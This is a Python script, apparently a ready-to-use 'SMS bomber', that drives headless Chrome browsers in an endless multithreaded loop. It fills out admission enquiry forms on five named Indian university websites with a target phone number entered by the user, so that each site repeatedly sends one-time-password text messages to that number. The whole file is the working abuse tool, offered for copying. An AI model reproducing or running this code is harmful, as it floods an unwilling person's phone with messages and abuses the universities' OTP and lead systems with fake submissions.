"""You are free to use or copy this code, but please ensure the proper credit is given to the author"""

    # AUTHOR : BASANT 
    # INSTAGRAM : PSYCHOBASANT
    # MAIL : MAIBASANTHOON@GMAIL.COM
import os
from selenium import webdriver
import time
from selenium.webdriver.common.by import By
from selenium.webdriver.common.keys import Keys
from concurrent.futures import ThreadPoolExecutor, wait
from selenium.webdriver.chrome.options import Options
import requests
# browser = webdriver.Chrome()

options = Options()
options.add_argument("--headless=new")   # modern headless mode
options.add_argument("--disable-gpu")
options.add_argument("--window-size=1920,1080")
# browser = webdriver.Chrome(options=options)

# url1 = "https://admissions.aryacollege.in/"

from colorama import Fore
RED = Fore.RED
GREEN = Fore.GREEN
CYAN = Fore.CYAN

def check_connection():
    try:
         requests.get("https://www.namecheap.com/visual/font-generator/checkmarks/")
         pass
    except:
        print(f"{RED}[-] {CYAN}No Internet connection !")
        exit()
def clear():
    if os.name == "nt": 
        os.system("cls")
    else:
        os.system("clear")
clear()
#ascii art
print(f"""
{RED}                                                                                     
██  ██ ▄████▄ ██▄  ▄██ █████▄  ▄████▄    ██{CYAN} 
 ▀██▀  ██▄▄██ ██ ▀▀ ██ ██▄▄██▄ ██▄▄██    ██{GREEN}
  ██   ██  ██ ██    ██ ██   ██ ██  ██ ████▀                                                                     
                   {RED}       v 0.0.1
""")

def details(x, y):
    # browser = webdriver.Chrome(options=options)
    y.get(x)
    mail = y.find_element(By.XPATH, """//*[@id="Email"]""")
    mail.send_keys("esjghjg2@aol.com")
    number = y.find_element(By.XPATH, """//*[@id="Mobile"]""")
    number.send_keys(target)
    send_otp = y.find_element(By.XPATH, """//*[@id="otpverifylink_aMobile"]""").click()
    print(f"{GREEN}[✔] {CYAN}otp sent")

def sharda():
    browser = webdriver.Chrome(options=options)
    url = "https://www.shardauniversity.com/btech/?utm_source=Google_Search&utm_medium=cpc_Responsive_Btech&utm_campaign=2026-Addon-All-Programmes(S)&utm_keyword=btech%20university&gad_source=1&gad_campaignid=23328537989&gbraid=0AAAAADfFNq0kAOvqRuShpTtLEEcGPjuMQ&gclid=CjwKCAiAzOXMBhASEiwAe14SaWdIQmXi0EhGwNDww1DShLfVUko0Kg8YtOutzXVkTp7_AtcF4Gsa7xoCU2UQAvD_BwE"
    # browser.get(url)
    try:
        browser.get(url)
        name = browser.find_element(By.XPATH, """//*[@id="pills-home"]/div[1]/div/div[2]/input""")
        name.send_keys("Basant")
        email = browser.find_element(By.XPATH, """//*[@id="pills-home"]/div[1]/div/div[3]/div/input""")
        email.send_keys("fckrty@gmail.com")
        course = browser.find_element(By.XPATH, """//*[@id="pills-home"]/div[1]/div/div[4]/div/select""")
        course.send_keys("B")
        # time.sleep(2)
        state = browser.find_element(By.XPATH, """//*[@id="pills-home"]/div[1]/div/div[5]/div/select""")
        state.send_keys("G")
        city = browser.find_element(By.XPATH, """//*[@id="pills-home"]/div[1]/div/div[6]/div/select""")
        city.send_keys("N")
        number = browser.find_element(By.XPATH, """//*[@id="pills-home"]/div[1]/div/div[7]/div/input""")
        number.send_keys(target)
        send_otp = browser.find_element(By.XPATH, """//*[@id="pills-home"]/div[1]/div/div[7]/div/span/button""").click()
        print(f"{GREEN}[✔] {CYAN}otp sent")
    except:
        print()
    finally:
        browser.quit()
def amitu():
    browser = webdriver.Chrome(options=options)
    url = "https://noida.amity.edu/admissions-2026/btech/"
    # browser.get(url)
    try:
        browser.get(url)
        name = browser.find_element(By.XPATH, """//*[@id="form"]/div[1]/input""")
        name.send_keys("basant")
        mail = browser.find_element(By.XPATH, """//*[@id="form"]/div[2]/div/input""")
        mail.send_keys("lookup2@gmail.com")
        number = browser.find_element(By.XPATH, """//*[@id="form"]/div[3]/div[2]/input""")
        number.send_keys(target)
        send_otp = browser.find_element(By.XPATH, """//*[@id="form"]/div[3]/div[3]/button""").click()
        print(f"{GREEN}[✔] {CYAN}otp sent")
    except:
        print()
    finally:
        browser.quit()
def nims():
    browser = webdriver.Chrome(options=options)
    url = "https://admission.nimsuniversity.org/"
    try:
       details(url, browser)
    except:
        print()
    finally:
        browser.quit()
def muj():
    browser = webdriver.Chrome(options=options)
    url = "https://admissions.jaipur.manipal.edu/"
    try:
        details(url, browser)
    except:
        print()
    finally:
        browser.quit()
def arya():
    browser = webdriver.Chrome(options=options)
    url = "https://admissions.aryacollege.in/"
    try:
        details(url, browser)
    except:
        print()
    finally:
        browser.quit()
check_connection()
target = input(f"[-] {CYAN}Enter a number without (+91) ")
print(f"{GREEN}[+] {CYAN}Press Ctrl + C to stop")
print("starting...")
with ThreadPoolExecutor(max_workers=5) as executor:
    while True: # infinite loop
        f1 = executor.submit(sharda)
        f2 = executor.submit(amitu)
        f3 = executor.submit(nims)
        f4 = executor.submit(muj)
        f5 = executor.submit(arya)
        wait([f1, f2, f3, f4, f5])
        time.sleep(1)  
